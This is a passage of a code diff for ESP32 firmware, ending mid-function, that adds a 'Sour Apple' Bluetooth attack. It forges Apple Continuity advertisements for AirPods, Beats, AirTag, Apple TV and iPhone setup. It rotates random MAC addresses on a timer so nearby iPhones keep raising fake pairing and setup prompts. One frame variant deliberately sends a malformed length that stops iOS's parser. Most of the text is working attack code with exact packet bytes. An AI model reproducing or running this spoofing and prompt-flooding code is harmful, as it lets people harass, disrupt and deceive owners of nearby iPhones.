+static const uint16_t kRatesMs[] = {1000, 2000, 5000, 10000, 20000};
+static constexpr uint8_t kRateCount = sizeof(kRatesMs) / sizeof(kRatesMs[0]);
+static constexpr uint8_t kDefaultRateIndex = 1;  // 2s
+static constexpr unsigned long kFieldMs = 250;
+static constexpr unsigned long kTouchPollMs = 50;
+static constexpr unsigned long kLogMs = 2000;
+static constexpr unsigned long kSerialMs = 3000;
 
-uint8_t packet[17];
+// The Apple Continuity frames this feature can impersonate. The two "Nearby
+// Action" (0x0F) layouts differ in whether the AppleJuice preamble TLV is
+// present and in whether the 3 bytes after the action are the fixed
+// 60 4C 95 tag or fresh random ones. Measured on an iPhone those choices
+// decide whether any prompt shows up at all, so they are selectable from the
+// screen with UP/DOWN instead of being guessed.
+enum SourBuilder : uint8_t {
+  // Automatic: walks every model of every family below, in turn, so nothing has
+  // to be selected by hand and no frame is starved.
+  bAuto = 0,
+  // 0x07 "Proximity Pairing" family: the accessory prompts.
+  bAudioTag,     // 31-byte frame exactly as AirTag Spoofer sends
+  bAudioBle,     // 31-byte frame exactly as this firmware's BLE Spoofer sends
+  bAudioRef,     // 31-byte frame from EvilAppleJuice-ESP32
+  // 0x0F "Nearby Action" family: the setup / pairing prompts.
+  bShort17Orig,  // the original Sour Apple frame (random tag, overrun tail)
+  bSetup23,      // 23-byte frame, AppleJuice / EvilAppleJuice layout
+  bSetup23Rnd,   //   same, but the 3 tag bytes are randomised per frame
+  bShort17Rnd,   // 17-byte frame, action TLV first, random tag, clean tail
+  bShort17Fix,   //   same, fixed 60 4C 95 tag
+};
 
-#define MAX_LINES 30
-String lines[MAX_LINES];
-int currentLine = 0;
-int lineNumber = 1;
-const int lineHeight = 14;
+struct SourVariant {
+  const char* name;
+  uint8_t builder;
+};
 
-void runUI() {
+struct SourAction {
+  uint16_t code;  // 0x0F actions are one byte, 0x07 audio model IDs are two
+  const char* name;
+};
 
-  static const unsigned char* icons[ICON_NUM] = {
-    bitmap_icon_go_back
-  };
+// "Nearby Action" (0x0F) action codes: each one makes the iPhone offer a
+// different setup/pairing prompt.
+static const SourAction kSetupActions[] = {
+  {0x01, "AppleTV Setup"},
+  {0x06, "AppleTV Pair"},
+  {0x20, "AppleTV New User"},
+  {0x0B, "HomePod Setup"},
+  {0x0D, "HomeKit Setup"},
+  {0x13, "Keyboard"},
+  {0x27, "Connect to Network"},
+  {0x2B, "AppleID Setup"},
+  {0xC0, "Audio Sync"},
+  {0x02, "Transfer Number"},
+  {0x09, "Setup New Phone"},
+  {0x1E, "TV Color Balance"},
+  {0x2D, "Code 0x2D"},
+  {0x2F, "Code 0x2F"},
+};
+static constexpr uint8_t kSetupActionCount =
+  sizeof(kSetupActions) / sizeof(kSetupActions[0]);
 
-  tft.drawFastHLine(0, 19, 240, UI_LINE);
+// "Proximity Pairing" (0x07) audio model IDs, one prompt per accessory.
+static const SourAction kAudioModels[] = {
+  {0x02, "AirPods"},
+  {0x03, "PowerBeats"},
+  {0x05, "Beats X"},
+  {0x06, "Beats Solo 3"},
+  {0x09, "Beats Studio 3"},
+  {0x0A, "AirPods Max"},
+  {0x0B, "PowerBeats Pro"},
+  {0x0C, "Beats Solo Pro"},
+  {0x0E, "AirPods Pro"},
+  {0x0F, "AirPods Gen 2"},
+  {0x10, "Beats Flex"},
+  {0x11, "Beats Studio Buds"},
+  {0x12, "Beats Fit Pro"},
+  {0x13, "AirPods Gen 3"},
+  {0x14, "AirPods Pro G2"},
+  {0x16, "Beats Studio Buds+"},
+  {0x17, "Beats Studio Pro"},
+  {0x24, "AirPods Pro USBC"},
+  {0x25, "Beats Solo 4"},
+  {0x26, "Beats Solo Buds"},
+  {0x2E, "Software Update"},
+  {0x2F, "Powerbeats Fit"},
+};
+static constexpr uint8_t kAudioModelCount =
+  sizeof(kAudioModels) / sizeof(kAudioModels[0]);
 
-  if (!uiDrawn) {
+// 0x07 model IDs exactly as this firmware's BLE Spoofer sends them: 16-bit
+// model at index 10 of the frame, one prompt per AirPods/Beats accessory.
+static const SourAction kAppleBleModels[] = {
+  {0x0220, "AirPods"},
+  {0x0E20, "AirPods Pro"},
+  {0x0A20, "AirPods Max"},
+  {0x0F20, "AirPods Gen 2"},
+  {0x1320, "AirPods Gen 3"},
+  {0x1420, "AirPods Pro G2"},
+  {0x0320, "PowerBeats"},
+  {0x0B20, "PowerBeats Pro"},
+  {0x0C20, "Beats Solo Pro"},
+  {0x1120, "Beats Studio Buds"},
+  {0x1020, "Beats Flex"},
+  {0x0520, "Beats X"},
+  {0x0620, "Beats Solo 3"},
+  {0x0920, "Beats Studio 3"},
+  {0x1720, "Beats Studio Pro"},
+  {0x1220, "Beats Fit Pro"},
+  {0x1620, "Beats Studio Buds+"},
+};
+static constexpr uint8_t kAppleBleModelCount =
+  sizeof(kAppleBleModels) / sizeof(kAppleBleModels[0]);
 
-    tft.drawFastHLine(0, 19, 240, UI_LINE);
-    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
+// AirTag Spoofer uses the same 0x07 layout with AirTag model IDs.
+static const SourAction kAirTagModels[] = {
+  {0x0055, "AirTag"},
+  {0x0030, "AirTag Alt"},
+};
+static constexpr uint8_t kAirTagModelCount =
+  sizeof(kAirTagModels) / sizeof(kAirTagModels[0]);
 
-    for (int i = 0; i < ICON_NUM; i++) {
-      if (icons[i] != NULL) {
-        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
-      }
-    }
-    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
-    uiDrawn = true;
+// The automatic rotation is a short, deliberately interleaved pool: only the
+// frames that produced prompts on the test iPhone (AirTag 7, AirPods/Beats 4,
+// the original 0x0F frame 1), with consecutive entries from different families
+// so the phone is never hit with a long run of the same type. Twelve frames
+// means, at the default 2s rate, the same identity comes back every ~24s.
+struct SourAutoEntry {
+  uint8_t builder;
+  uint16_t code;
+  const char* familyName;  // FRAME row + serial
+  const char* name;        // ACTION row
+};
+
+static const SourAutoEntry kAutoPool[] = {
+  {bAudioTag,    0x0055, "aud tag",  "AirTag"},
+  {bAudioBle,    0x0220, "aud ble",  "AirPods"},
+  {bShort17Orig, 0x27,   "orig 17B", "Connect to Network"},
+  {bAudioTag,    0x0030, "aud tag",  "AirTag Alt"},
+  {bAudioBle,    0x0E20, "aud ble",  "AirPods Pro"},
+  {bShort17Orig, 0x01,   "orig 17B", "AppleTV Setup"},
+  {bAudioBle,    0x0F20, "aud ble",  "AirPods Gen 2"},
+  {bShort17Orig, 0x09,   "orig 17B", "Setup New Phone"},
+  {bAudioBle,    0x0320, "aud ble",  "PowerBeats"},
+  {bShort17Orig, 0x2B,   "orig 17B", "AppleID Setup"},
+  {bAudioBle,    0x0520, "aud ble",  "Beats X"},
+  {bShort17Orig, 0x02,   "orig 17B", "Transfer Number"},
+};
+static constexpr uint8_t kAutoPoolCount =
+  sizeof(kAutoPool) / sizeof(kAutoPool[0]);
+
+static const SourVariant kVariants[] = {
+  // Automatic first: the whole point is the largest possible number of prompts
+  // without having to pick a device type by hand.
+  {"auto",     bAuto},
+  {"aud tag",  bAudioTag},
+  {"aud ble",  bAudioBle},
+  {"aud ref",  bAudioRef},
+  {"orig 17B", bShort17Orig},
+  {"ref fix",  bSetup23},
+  {"ref rnd",  bSetup23Rnd},
+  {"sht rnd",  bShort17Rnd},
+  {"sht fix",  bShort17Fix},
+};
+static constexpr uint8_t kVariantCount =
+  sizeof(kVariants) / sizeof(kVariants[0]);
+
+static int iconX[kIconCount] = {10};
+static int iconY = kStatusBarY;
+
+static bool s_uiDrawn = false;
+static bool s_staticDrawn = false;
+static bool s_running = false;
+static bool s_advConfigured = false;
+static bool s_addrIsRandom = false;
+static unsigned long s_lastBtnMs = 0;
+static unsigned long s_lastRotateMs = 0;
+static unsigned long s_lastFieldMs = 0;
+static unsigned long s_lastLogMs = 0;
+static unsigned long s_lastSerialMs = 0;
+static uint32_t s_txCount = 0;
+static uint8_t s_variantIndex = 0;
+static uint8_t s_activeBuilder = bAudioTag;  // builder used for the last packet
+static uint16_t s_activeCode = 0;            // code of the last packet
+static const char* s_activeName = "AirTag";  // display name of the last packet
+static const char* s_activeFamilyName = "aud tag";
+static uint8_t s_autoItem = 0;               // auto rotation: cursor into kAutoPool
+static uint8_t s_rateIndex = kDefaultRateIndex;
+
+static uint8_t s_mac[6] = {0};      // NimBLE native order: [5] is the MSB
+static uint8_t s_packet[31] = {0};  // exact frame handed to the controller
+static size_t s_packetLen = 0;
+
+static BLEServer* s_server = nullptr;
+static BLEAdvertising* s_advertising = nullptr;
+
+static char s_log[kMaxLog][kLogLineLen];
+static uint16_t s_logColor[kMaxLog];
+static int s_logCount = 0;
+static char s_dispLog[kMaxLog][kLogLineLen];
+static uint16_t s_dispColor[kMaxLog];
+
+static char s_cacheState[20] = {0};
+static char s_cacheMac[24] = {0};
+static char s_cacheFrame[20] = {0};
+static char s_cacheAction[28] = {0};
+static char s_cacheRate[24] = {0};
+static char s_cacheTx[16] = {0};
+
+static int rowY(int row) {
+  return kInfoY + 4 + row * kRowH;
+}
+
+static int logBottomY() {
+  // Leave a 2px gap above the touch nav bar.
+  return bleContentBottom() - 2;
+}
+
+static int logVisibleLines() {
+  const int h = logBottomY() - kLogY;
+  if (h < kLogLineH) {
+    return 1;
+  }
+  int n = h / kLogLineH;
+  if (n > kMaxLog) {
+    n = kMaxLog;
+  }
+  return n;
+}
+
+// Repaint only when the text actually changed: the loop runs every few
+// milliseconds and must never spend that time on avoidable SPI traffic.
+static void paintField(int x, int y, int w, char* cache, size_t cacheSz,
+                       const char* text, uint16_t color) {
+  if (!text) {
+    text = "";
+  }
+  if (cache && strcmp(cache, text) == 0) {
+    return;
   }
 
-  static unsigned long lastAnimationTime = 0;
-  static int animationState = 0;
-  static int activeIcon = -1;
-
-  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
-    if (animationState == 1) {
-      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
-      animationState = 2;
-
-      switch (activeIcon) {
-        case 0: feature_exit_requested = true; break;
-      }
-    } else if (animationState == 2) {
-      animationState = 0;
-      activeIcon = -1;
+  tft.setTextSize(1);
+  int clearW = w;
+  if (cache && cache[0]) {
+    const int oldW = tft.textWidth(cache) + 2;
+    const int newW = text[0] ? (tft.textWidth(text) + 2) : 0;
+    clearW = oldW > newW ? oldW : newW;
+    if (clearW > w) {
+      clearW = w;
     }
-    lastAnimationTime = millis();
+  }
+  tft.fillRect(x, y, clearW, kFieldH, TFT_BLACK);
+  tft.setTextColor(color, TFT_BLACK);
+  tft.setCursor(x, y);
+  tft.print(text);
+
+  if (cache && cacheSz > 0) {
+    strncpy(cache, text, cacheSz - 1);
+    cache[cacheSz - 1] = '\0';
+  }
+}
+
+static void paintFieldRight(int y, int rightMargin, char* cache, size_t cacheSz,
+                            const char* text, uint16_t color) {
+  if (!text) {
+    text = "";
+  }
+  if (cache && strcmp(cache, text) == 0) {
+    return;
+  }
+
+  tft.setTextSize(1);
+  const int newW = text[0] ? tft.textWidth(text) : 0;
+  const int oldW = (cache && cache[0]) ? tft.textWidth(cache) : 0;
+  const int useW = oldW > newW ? oldW : newW;
+  const int clearW = useW + 2;
+  tft.fillRect(SCREEN_WIDTH - rightMargin - clearW, y, clearW, kFieldH, TFT_BLACK);
+  tft.setTextColor(color, TFT_BLACK);
+  tft.setCursor(SCREEN_WIDTH - rightMargin - newW, y);
+  tft.print(text);
+  if (cache && cacheSz > 0) {
+    strncpy(cache, text, cacheSz - 1);
+    cache[cacheSz - 1] = '\0';
+  }
+}
+
+static void drawStaticChrome() {
+  if (s_staticDrawn) {
+    return;
+  }
+  s_staticDrawn = true;
+
+  tft.setTextSize(1);
+  tft.setTextColor(ORANGE, TFT_BLACK);
+  tft.setCursor(kLabelX, rowY(0));
+  tft.print("STATE");
+  tft.setCursor(kLabelX, rowY(1));
+  tft.print("MAC");
+  tft.setCursor(kLabelX, rowY(2));
+  tft.print("FRAME");
+  tft.setCursor(kLabelX, rowY(3));
+  tft.print("ACTION");
+  tft.setCursor(kLabelX, rowY(4));
+  tft.print("RATE");
+
+  tft.fillRect(0, kLogHdrY, SCREEN_WIDTH, kLogY - kLogHdrY, TFT_BLACK);
+  tft.setTextColor(ORANGE, TFT_BLACK);
+  tft.setCursor(kLabelX, kLogHdrY + 2);
+  tft.print("ACTIVITY");
+  const int ruleX = kLabelX + tft.textWidth("ACTIVITY") + 8;
+  tft.drawFastHLine(ruleX, kLogHdrY + 6, SCREEN_WIDTH - kRightMargin - ruleX, UI_LINE);
+}
+
+static const SourAction* activeTable(uint8_t builder, uint8_t* count) {
+  switch (builder) {
+    case bAudioBle:
+      *count = kAppleBleModelCount;
+      return kAppleBleModels;
+    case bAudioTag:
+      *count = kAirTagModelCount;
+      return kAirTagModels;
+    case bAudioRef:
+      *count = kAudioModelCount;
+      return kAudioModels;
+    default:
+      *count = kSetupActionCount;
+      return kSetupActions;
+  }
+}
+
+// Total frames the current selection walks. Shown on screen because the repeat
+// interval that matters to the phone is rate x pool size.
+static uint16_t currentPoolSize() {
+  if (kVariants[s_variantIndex].builder == bAuto) {
+    return kAutoPoolCount;
+  }
+  uint8_t c = 0;
+  activeTable(s_activeBuilder, &c);
+  return c;
+}
+
+static void updateInfoFields(bool force) {
+  drawStaticChrome();
+
+  if (force) {
+    s_cacheState[0] = '\0';
+    s_cacheMac[0] = '\0';
+    s_cacheFrame[0] = '\0';
+    s_cacheAction[0] = '\0';
+    s_cacheTx[0] = '\0';
+    s_cacheRate[0] = '\0';
+  }
+
+  char mac[24];
+  if (s_running) {
+    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
+             s_mac[5], s_mac[4], s_mac[3], s_mac[2], s_mac[1], s_mac[0]);
+  } else {
+    snprintf(mac, sizeof(mac), "--:--:--:--:--:--");
+  }
+
+  char frame[20];
+  if (kVariants[s_variantIndex].builder == bAuto) {
+    // Stopped: just "auto". Running: "auto: <current group>", which changes
+    // every rotation as the interleaved pool advances.
+    snprintf(frame, sizeof(frame), s_running ? "auto: %s" : "auto",
+             s_activeFamilyName);
+  } else {
+    snprintf(frame, sizeof(frame), "%s %u/%u", kVariants[s_variantIndex].name,
+             (unsigned)(s_variantIndex + 1), (unsigned)kVariantCount);
+  }
+
+  char action[28];
+  if (s_activeCode > 0xFF) {
+    snprintf(action, sizeof(action), "0x%04X %s", (unsigned)s_activeCode, s_activeName);
+  } else {
+    snprintf(action, sizeof(action), "0x%02X %s", (unsigned)s_activeCode, s_activeName);
+  }
+
+  char tx[16];
+  snprintf(tx, sizeof(tx), "TX %lu", (unsigned long)s_txCount);
+
+  // The repeat interval that matters to the phone is how long until the same
+  // frame comes round again, so show the whole cycle too.
+  const uint16_t pool = currentPoolSize();
+  const unsigned long rateS = (unsigned long)kRatesMs[s_rateIndex] / 1000UL;
+  char rate[24];
+  snprintf(rate, sizeof(rate), "%lus cycle %lus", rateS,
+           rateS * (unsigned long)(pool ? pool : 1));
+
+  paintField(kValueX, rowY(0), kValueW, s_cacheState, sizeof(s_cacheState),
+             s_running ? "Advertising" : "Idle", s_running ? UI_OK : UI_DIM_TEXT);
+  paintFieldRight(rowY(0), kRightMargin, s_cacheTx, sizeof(s_cacheTx), tx, UI_DIM_TEXT);
+  paintField(kValueX, rowY(1), kValueW + 40, s_cacheMac, sizeof(s_cacheMac), mac, WHITE);
+  paintField(kValueX, rowY(2), kValueW + 40, s_cacheFrame, sizeof(s_cacheFrame),
+             frame, ORANGE);
+  paintField(kValueX, rowY(3), SCREEN_WIDTH - kValueX - kRightMargin, s_cacheAction,
+             sizeof(s_cacheAction), action, WHITE);
+  paintField(kValueX, rowY(4), kValueW + 40, s_cacheRate, sizeof(s_cacheRate),
+             rate, UI_DIM_TEXT);
+}
+
+static void paintLogSlot(int index, const char* text, uint16_t color) {
+  const int cap = logVisibleLines();
+  const int bottom = logBottomY();
+  if (index < 0 || index >= cap) {
+    return;
+  }
+  if (!text) {
+    text = "";
+  }
+
+  const int y = kLogY + index * kLogLineH;
+  if (y + kLogLineH > bottom) {
+    return;
+  }
+  if (strcmp(s_dispLog[index], text) == 0 && s_dispColor[index] == color) {
+    return;
+  }
+
+  tft.setTextSize(1);
+  tft.fillRect(0, y, SCREEN_WIDTH, kLogLineH, TFT_BLACK);
+  if (text[0]) {
+    tft.setTextColor(color, TFT_BLACK);
+    tft.setCursor(kLabelX, y);
+    tft.print(text);
+  }
+
+  strncpy(s_dispLog[index], text, kLogLineLen - 1);
+  s_dispLog[index][kLogLineLen - 1] = '\0';
+  s_dispColor[index] = color;
+}
+
+static void syncLogDisplay() {
+  const int cap = logVisibleLines();
+  for (int i = 0; i < cap; i++) {
+    if (i < s_logCount) {
+      paintLogSlot(i, s_log[i], s_logColor[i]);
+    } else if (s_dispLog[i][0]) {
+      paintLogSlot(i, "", TFT_BLACK);
+    }
+  }
+}
+
+static void logLine(const char* text, uint16_t color) {
+  if (!text) {
+    text = "";
+  }
+  const int cap = logVisibleLines();
+  const bool scrolled = (s_logCount >= cap);
+
+  if (scrolled) {
+    for (int i = 0; i < cap - 1; i++) {
+      memcpy(s_log[i], s_log[i + 1], kLogLineLen);
+      s_logColor[i] = s_logColor[i + 1];
+    }
+    s_logCount = cap - 1;
+  }
+
+  strncpy(s_log[s_logCount], text, kLogLineLen - 1);
+  s_log[s_logCount][kLogLineLen - 1] = '\0';
+  s_logColor[s_logCount] = color;
+  const int lineIdx = s_logCount;
+  s_logCount++;
+
+  if (scrolled) {
+    // Shifted lines: repaint each dirty slot only (no full-zone wipe).
+    syncLogDisplay();
+    return;
+  }
+  paintLogSlot(lineIdx, s_log[lineIdx], color);
+}
+
+static void updateNavLabels() {
+  if (!featureHasTouchNavBar()) {
+    return;
+  }
+  // Remapped layout: LEFT=Exit, SELECT=Start/Stop (the screen's main action),
+  // UP/DOWN walk the frame variants, RIGHT cycles the hold time.
+  setTouchNavLabels("Exit", "Next", s_running ? "Stop" : "Start", "Prev", "Rate");
+  redrawTouchButtonBar();
+}
+
+static void runUI() {
+  static const unsigned char* icons[kIconCount] = {bitmap_icon_go_back};
+
+  if (!s_uiDrawn) {
+    tft.fillRect(0, kStatusBarY, SCREEN_WIDTH, kStatusBarH, DARK_GRAY);
+    for (int i = 0; i < kIconCount; i++) {
+      if (icons[i] != NULL) {
+        tft.drawBitmap(iconX[i], iconY, icons[i], kIconSize, kIconSize, ORANGE);
+      }
+    }
+    tft.drawFastHLine(0, kStatusBarY + kStatusBarH, SCREEN_WIDTH, UI_LINE);
+    s_uiDrawn = true;
   }
 
   static unsigned long lastTouchCheck = 0;
-  static bool s_backIconHeld = false;
-  const unsigned long touchCheckInterval = 25;
+  if (millis() - lastTouchCheck < kTouchPollMs) {
+    return;
+  }
+  lastTouchCheck = millis();
 
-  if (millis() - lastTouchCheck >= touchCheckInterval) {
-    int x = 0;
-    int y = 0;
-    bool hitBack = false;
-    if (feature_active && readTouchXY(x, y)) {
-      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
-        for (int i = 0; i < ICON_NUM; i++) {
-          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
-            if (icons[i] != NULL && animationState == 0) {
-              hitBack = true;
-            }
-            break;
-          }
-        }
-      }
-    }
-    if (hitBack && !s_backIconHeld) {
+  int x = 0;
+  int y = 0;
+  if (!feature_active || !readTouchXY(x, y)) {
+    return;
+  }
+  if (y <= kStatusBarY || y >= kStatusBarY + kStatusBarH) {
+    return;
+  }
+  for (int i = 0; i < kIconCount; i++) {
+    if (x > iconX[i] && x < iconX[i] + kIconSize) {
       feature_exit_requested = true;
+      break;
     }
-    s_backIconHeld = hitBack;
-    lastTouchCheck = millis();
   }
 }
 
-void updatedisplay() {
-  float currentBatteryVoltage = readBatteryVoltage();
-  drawStatusBar(currentBatteryVoltage, true);
-  runUI();
-  tft.setTextColor(TFT_GREEN, TFT_BLACK);
-  tft.setTextSize(1);
+// Frame templates. Only the action/model byte differs between frames; the
+// optional random tail keeps otherwise identical frames from looking like a
+// replay of the same advertisement.
+static const uint8_t kFrameSetup[23] = {
+  0x16, 0xFF, 0x4C, 0x00,                    // AD: len 22, manufacturer, Apple
+  0x04, 0x04, 0x2A, 0x00, 0x00, 0x00,        // continuity TLV 0x04
+  0x0F, 0x05, 0xC1, 0x00,                    // continuity TLV 0x0F, action patched below
+  0x60, 0x4C, 0x95,                          // 60 4C 95 action tag
+  0x00, 0x00, 0x10, 0x00, 0x00, 0x00,        // padding TLVs, parse cleanly to the end
+};
 
-  const int scrollBottom = bleContentBottom();
-  for (int offset = 0; offset <= lineHeight; offset += 2) {
-    const int baseY = (MAX_LINES - 1) * lineHeight - offset + 51;
-    if (baseY + lineHeight <= scrollBottom) {
-      tft.fillRect(0, baseY, 240, lineHeight, TFT_BLACK);
+static const uint8_t kFrameShort[17] = {
+  0x10, 0xFF, 0x4C, 0x00,                    // AD: len 16, manufacturer, Apple
+  0x0F, 0x05, 0xC1, 0x00,                    // continuity TLV 0x0F, first in the frame
+  0x60, 0x4C, 0x95,                          // action tag
+  0x00, 0x00, 0x10, 0x00, 0x00, 0x00,        // padding TLVs
+};
+
+static void buildSourPacket() {
+  uint8_t builder = kVariants[s_variantIndex].builder;
+  uint16_t code = 0;
+  const char* name = "";
+  const char* familyName = kVariants[s_variantIndex].name;
+
+  if (builder == bAuto) {
+    // Walk the short interleaved pool: consecutive frames come from different
+    // families, and the same identity returns after kAutoPoolCount rotations.
+    const SourAutoEntry& e = kAutoPool[s_autoItem];
+    s_autoItem = (uint8_t)((s_autoItem + 1) % kAutoPoolCount);
+    builder = e.builder;
+    code = e.code;
+    name = e.name;
+    familyName = e.familyName;
+  } else {
+    uint8_t count = 0;
+    const SourAction* table = activeTable(builder, &count);
+    const SourAction& item = table[random((long)count)];
+    code = item.code;
+    name = item.name;
+  }
+
+  s_activeBuilder = builder;
+  s_activeCode = code;
+  s_activeName = name;
+  s_activeFamilyName = familyName;
+
+  switch (builder) {
+    case bAudioBle: {
+      // Byte for byte the frame this firmware's BLE Spoofer already sends for
+      // Apple Continuity: Flags AD, manufacturer AD, 16-bit model at 10..11.
+      static const uint8_t kTemplate[31] = {
+        0x02, 0x01, 0x1A,                                 // Flags AD
+        0x1B, 0xFF, 0x4C, 0x00,                           // manufacturer AD
+        0x07, 0x16,                                       // 0x07 + payload len
+        0x07,                                             // status
+        0x00, 0x00,                                       // model, patched below
+        0x75, 0xAA, 0x30, 0x01, 0x00, 0x00,               // continuity signature
+        0x45, 0x12, 0x12, 0x12,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+      };
+      memcpy(s_packet, kTemplate, sizeof(kTemplate));
+      s_packet[10] = (uint8_t)(code >> 8);
+      s_packet[11] = (uint8_t)(code & 0xFF);
+      s_packetLen = sizeof(kTemplate);
+      return;
     }
 
-    for (int i = 0; i < MAX_LINES; i++) {
-      int y = -lineHeight + (i * lineHeight) + offset;
-      const int drawY = y + 51;
-      if (y >= -lineHeight && drawY + lineHeight <= scrollBottom) {
-        tft.fillRect(0, drawY, 240, lineHeight, TFT_BLACK);
-        tft.setCursor(5, drawY + 4);
-        tft.print(lines[i]);
+    case bAudioTag: {
+      // Byte for byte the frame AirTag Spoofer already sends: 0x05 prefix
+      // ("new AirTag"), 16-bit model at 7..8, 16 random bytes at the end.
+      s_packet[0] = 0x1E;
+      s_packet[1] = 0xFF;
+      s_packet[2] = 0x4C;
+      s_packet[3] = 0x00;
+      s_packet[4] = 0x07;
+      s_packet[5] = 0x19;
+      s_packet[6] = 0x05;
+      s_packet[7] = (uint8_t)(code >> 8);
+      s_packet[8] = (uint8_t)(code & 0xFF);
+      s_packet[9] = 0x55;
+      s_packet[10] = (uint8_t)((random(10) << 4) | random(10));
+      s_packet[11] = (uint8_t)((random(8) << 4) | random(10));
+      s_packet[12] = (uint8_t)random(256);
+      s_packet[13] = 0x00;
+      s_packet[14] = 0x00;
+      esp_fill_random(&s_packet[15], 16);
+      s_packetLen = 31;
+      return;
+    }
+
+    case bAudioRef: {
+      // EvilAppleJuice-ESP32's audio frame: one-byte model at index 7, then the
+      // fixed body, then fresh random bytes so no two frames are identical.
+      static const uint8_t kAudioHead[7] = {0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07};
+      static const uint8_t kAudioBody[11] =
+        {0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12};
+      memset(s_packet, 0, sizeof(s_packet));
+      memcpy(s_packet, kAudioHead, sizeof(kAudioHead));
+      s_packet[7] = (uint8_t)code;
+      memcpy(s_packet + 8, kAudioBody, sizeof(kAudioBody));
+      esp_fill_random(s_packet + 19, sizeof(s_packet) - 19);
+      s_packetLen = sizeof(s_packet);
+      return;
+    }
+
+    default:
+      break;
+  }
+
+  // 0x0F "Nearby Action" family.
+  const bool setup = (builder == bSetup23 || builder == bSetup23Rnd);
+  const size_t len = setup ? sizeof(kFrameSetup) : sizeof(kFrameShort);
+  memcpy(s_packet, setup ? kFrameSetup : kFrameShort, len);
+
+  const int actionOffset = setup ? 13 : 7;
+  s_packet[actionOffset] = (uint8_t)code;
+
+  if (builder == bSetup23Rnd || builder == bShort17Rnd ||
+      builder == bShort17Orig) {
+    // Fresh tag per frame: an identical frame from a new address still looks
+    // like a replay to the phone.
+    esp_fill_random(&s_packet[actionOffset + 1], 3);
+  }
+  if (builder == bShort17Orig) {
+    // The original Sour Apple tail: "10 <random x3>" declares a random TLV
+    // length that overruns the frame, and that is where iOS' parser stops.
+    s_packet[13] = 0x10;
+    esp_fill_random(&s_packet[14], 3);
+  }
+  s_packetLen = len;
+}
+
+// Fresh random-static address. ble_hs_id_set_rnd() takes the address in
+// NimBLE native order (index 5 is the most-significant byte), and a
+// random-static address has its two most-significant bits set.
+static void newRandomStaticAddress() {
+  uint8_t mac[6];
+  for (int attempt = 0; attempt < 8; attempt++) {
+    esp_fill_random(mac, sizeof(mac));
+    mac[5] |= 0xC0;
+    mac[0] &= 0xFE;   // unicast
+    if (ble_hs_id_set_rnd(mac) == 0) {
+      memcpy(s_mac, mac, sizeof(s_mac));
+      return;
+    }
+  }
+}
+
+static bool ensureAdvertising() {
+  if (!s_advertising) {
+    ensureBleStackReady();
+    if (!s_server) {
+      s_server = BLEDevice::createServer();
+    }
+    if (s_server) {
+      s_advertising = s_server->getAdvertising();
+    }
+  }
+  return s_advertising != nullptr;
+}
+
+static void stopRadio() {
+  // Guarded: stopping an inactive advertiser only logs an HCI error.
+  if (s_advertising && s_advertising->isAdvertising()) {
+    s_advertising->stop();
+  }
+}
+
+// stop -> new address -> exact frame -> start, the rotation order documented
+// for the Apple path in BleSpoofer: the controller rejects an address change
+// while advertising, and changing it mid-transmission is what locked up the
+// S3 in the older attempt.
+static void rotateAdvertising() {
+  s_lastRotateMs = millis();
+
+  if (!ensureAdvertising()) {
+    return;
+  }
+
+  stopRadio();
+
+  if (!s_addrIsRandom) {
+    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
+    s_addrIsRandom = true;
+  }
+  newRandomStaticAddress();
+  buildSourPacket();
+
+  // Raw payload only: setFlags(), addServiceUUID() and addTxPower() each
+  // prepend their own AD structure and would corrupt the exact Apple frame.
+  BLEAdvertisementData advData;
+  advData.addData(std::string(reinterpret_cast<char*>(s_packet), s_packetLen));
+  s_advertising->setAdvertisementData(advData);
+
+  if (!s_advConfigured) {
+    // ADV_IND: the continuity action is only parsed from connectable
+    // undirected advertising.
+    s_advertising->setAdvertisementType(BLE_GAP_CONN_MODE_UND);
+    s_advertising->setMinInterval(0x20);
+    s_advertising->setMaxInterval(0x20);
+    s_advertising->setMinPreferred(0x20);
+    s_advertising->setMaxPreferred(0x20);
+    s_advConfigured = true;
+  }
+
+  if (s_advertising->start()) {
+    s_txCount++;
+    // Rate-limited radio diagnostic, same convention as BleSpoofer: proves
+    // the exact frame did leave the controller and from which address.
+    if ((uint32_t)(millis() - s_lastSerialMs) >= kSerialMs) {
+      s_lastSerialMs = millis();
+      const char* frameName = (kVariants[s_variantIndex].builder == bAuto)
+                                ? s_activeFamilyName
+                                : kVariants[s_variantIndex].name;
+      char idStr[8];
+      if (s_activeCode > 0xFF) {
+        snprintf(idStr, sizeof(idStr), "0x%04X", (unsigned)s_activeCode);
+      } else {
+        snprintf(idStr, sizeof(idStr), "0x%02X", (unsigned)s_activeCode);
       }
+      Serial.printf("[sourapple] #%lu %s MAC=%02X:%02X:%02X:%02X:%02X:%02X id=%s len=%u start=1 payload=",
+                    (unsigned long)s_txCount, frameName,
+                    s_mac[5], s_mac[4], s_mac[3], s_mac[2], s_mac[1], s_mac[0],
+                    idStr, (unsigned)s_packetLen);
+      for (size_t b = 0; b < s_packetLen; b++) {
+        Serial.printf("%02X", s_packet[b]);
+      }
+      Serial.println();
     }
-    delay(5);
+  } else if ((uint32_t)(millis() - s_lastLogMs) >= kLogMs) {
+    s_lastLogMs = millis();
+    logLine("[!] Radio refused start", UI_WARN);
+    Serial.println("[sourapple] start=0 (radio refused)");
   }
-  Advertising->stop();
 }
 
-void addLineToDisplay(String newLine) {
-  for (int i = MAX_LINES - 1; i > 0; i--) {
-    lines[i] = lines[i - 1];
+static void startAdvertising() {
+  if (!ensureAdvertising()) {
+    logLine("[!] BLE unavailable", UI_WARN);
+    return;
   }
-  lines[0] = newLine;
